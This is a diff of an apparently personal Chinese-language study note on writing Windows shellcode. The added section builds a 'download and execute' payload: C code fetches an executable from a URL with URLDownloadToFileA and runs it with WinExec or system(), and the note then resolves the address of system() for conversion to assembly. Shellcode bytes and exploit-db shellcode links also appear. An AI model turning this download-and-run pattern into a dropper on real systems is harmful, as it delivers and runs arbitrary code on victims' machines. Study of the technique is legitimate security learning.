@@ -63,6 +63,10 @@ int main(int argc, char** argv)
   
 <img src="./img/MessageBoxA.gif">
 
+### 代码逻辑
+
+
+
 - 注：
   - https://www.exploit-db.com/shellcodes/48229 - 会出现内存访问错误问题，还未调整
   - https://www.exploit-db.com/shellcodes/28996 - 会出现broken byte
@@ -166,11 +170,91 @@ char shellcode[] = \
 "\x78\x30\x34\x2d\x53\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2f\x65\x78\x65\x2f\x74\x65\x73\x74\x2e\x65\x78\x65\x00";
 ```
 
-跑urldownloadtofile
+## 下载执行 - shellcode
 
-<img src="./img/urldownloaderror.png">
+### C语言编写的代码
 
-- 〖122〗-传递到系统调用的数据区太小
+- 此处使用的URLDownloadToFile函数名为`URLDownloadToFileA`(区别于`URLDownloadToFileW`)
+- ~~WinExec执行~~
+    ```
+    若函数调用成功，则返回值大于31。若函数调用失败，则返回值为下列之一： 
+    0：系统内存或资源已耗尽。
+    ERROR_BAD_FORMAT：EXE文件无效（非Win32.EXE或.EXE影像错误）。 
+    ERROR_FILE_NOT_FOUND：指定的文件未找到。
+    ERROR_PATH_NOT_FOUND：指定的路径未找到。 
+    ```
+
+    ```c
+    # 一直报错 返回值为0
+    # 关掉无关程序，只留下该函数，还是报错0
+
+    #include <stdio.h>
+    #include <Urlmon.h>
+    #pragma comment(lib,"Urlmon.lib")
+
+    int main()
+    {
+        if (URLDownloadToFileA(NULL, "https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe", "e:\\test.exe", 0, 0) == S_OK)
+        {
+            printf("URLDownloadToFile OK\n");
+            int ret = WinExec("e:\\test.exe", 0);
+            printf("ret = %d\n",ret);
+        }
+        else
+        {
+            printf("URLDownloadToFile Fail,Error:%d\n", GetLastError());
+        }
+    }
+
+    ```
+- 换成system函数重新执行成功
+    ```c
+    #include <stdio.h>
+    #include <Urlmon.h>
+    #include <stdlib.h>
+    #pragma comment(lib,"Urlmon.lib")
+
+    int main()
+    {
+        if (URLDownloadToFileA(NULL, "https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe", "e:\\test.exe", 0, 0) == S_OK)
+        {
+            printf("URLDownloadToFile OK\n");
+            system("e:\\test.exe");
+        }
+        else
+        {
+            printf("URLDownloadToFile Fail,Error:%d\n", GetLastError());
+        }
+    }
+    ```
+
+### 转化成shellcode的过程
+
+#### 编写汇编代码
+
+##### URLDownloadFileA函数
+
+URLDownloadToFileA函数在 Urlmon.dll 这个dll中，这个dll不是默认加载的，所以可能还需要调用LoadLibrary函数
+
+##### System函数
+
+System函数的内存地址（由于ASLR的原因，函数的内存地址在每台机器上可能会不一样）。下面是获取DLL内存地址的代码，以获取DLL中导出函数System
+
+```
+#include "windows.h"
+#include "stdio.h"
+
+int main()
+{
+    HINSTANCE LibHandle = LoadLibrary("msvcrt.dll"); //要获取DLL的内存地址
+    printf("msvcrt Address = 0x%x \n",LibHandle);
+    LPTSTR getaddr = (LPTSTR)GetProcAddress(LibHandle, "system"); //获取DLL中导出函数地址
+    printf(“system Address = 0x%x \n", getaddr);
+
+    getchar();
+    return 0;
+}
+```
 
 # References
 
